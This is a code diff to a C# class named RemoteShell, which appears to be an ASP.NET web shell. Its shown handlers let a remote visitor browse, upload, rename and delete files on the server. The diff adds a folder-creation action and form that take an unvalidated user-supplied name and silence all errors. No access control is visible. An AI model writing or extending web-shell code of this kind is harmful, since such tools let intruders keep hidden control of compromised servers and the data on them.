@@ -52,6 +52,23 @@ public class RemoteShell
                     context.Response.Redirect(GetUrl(context, "dir", Path.GetDirectoryName(newPath)));
                 }
             }
+            else if (postAction == "create_folder")
+            {
+                string newFolderName = context.Request.Form["newFolderName"];
+                if (!string.IsNullOrEmpty(newFolderName))
+                {
+                    try 
+                    {
+                        string newPath = Path.Combine(currentDirectory, newFolderName);
+                        if (!Directory.Exists(newPath))
+                        {
+                            Directory.CreateDirectory(newPath);
+                        }
+                    }
+                    catch { } // Silent fail agar tidak error page
+                    context.Response.Redirect(GetUrl(context, "dir", currentDirectory));
+                }
+            }
         }
 
         // --- HANDLE DELETE ---
@@ -102,6 +119,12 @@ public class RemoteShell
         context.Response.Write("<form method='post' enctype='multipart/form-data' style='margin-bottom:15px;'>");
         context.Response.Write("<input type='hidden' name='cmd' value='upload'>");
         context.Response.Write("<input type='file' name='fileUpload'> <input type='submit' value='Upload Here'>");
+        context.Response.Write("</form>");
+        context.Response.Write("<form method='post' style='margin-bottom:15px; border-bottom:1px solid #444; padding-bottom:15px;'>");
+        context.Response.Write("<input type='hidden' name='cmd' value='create_folder'>");
+        context.Response.Write("<span>Create New Folder: </span>");
+        context.Response.Write("<input type='text' name='newFolderName' placeholder='Folder Name'> ");
+        context.Response.Write("<input type='submit' value='Create'>");
         context.Response.Write("</form>");
 
         // --- LOGIKA UTAMA VIEW ---
